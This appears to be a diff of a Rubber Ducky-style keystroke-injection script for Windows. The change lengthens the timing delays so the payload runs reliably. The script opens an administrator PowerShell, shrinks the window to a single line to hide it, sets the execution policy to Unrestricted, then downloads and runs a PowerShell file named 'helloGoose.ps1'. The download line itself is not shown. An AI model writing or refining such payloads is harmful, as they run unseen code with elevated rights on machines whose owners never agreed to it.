@@ -2,17 +2,17 @@ REM --> Brings up quick access menu
 WINDOWS x
 REM --> Brings up powershell admin
 STRING a
-DELAY 1
+DELAY 500
 LEFTARROW
 ENTER
-DELAY 1
+DELAY 500
 REM --> make window small
 STRING mode con:cols=18 lines=1
 ENTER
 REM --> Allows powershell scripts to be run, is set back to restricted in ps1 file after
 STRING Set-ExecutionPolicy -scope CurrentUser Unrestricted
 ENTER
-DELAY 1
+DELAY 500
 STRING Y
 ENTER
 REM --> Downloads ps1 file
@@ -21,5 +21,6 @@ ENTER
 REM --> runs ps1 file
 STRING ./helloGoose.ps1 "parameter title"
 ENTER
+DELAY 500
 STRING exit
 ENTER
